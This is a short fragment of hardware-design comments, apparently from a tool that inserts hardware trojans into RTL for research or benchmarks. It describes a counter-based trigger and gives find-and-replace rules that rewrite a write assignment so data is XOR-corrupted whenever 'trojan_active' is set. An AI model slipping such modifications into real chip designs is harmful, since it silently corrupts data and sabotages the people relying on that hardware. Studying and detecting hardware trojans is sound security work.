 ...
 *   
 * Trigger: Counter on selected
 * Payload: Corrupt write with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt write with XOR
//
// Integration Script Must Modify:
//
// IF write is assigned:
//   Find: assign write = data_value;
//   Replace: assign write = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF write is in always_ff:
//   Find: write <= data_value;
//   Replace: write <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
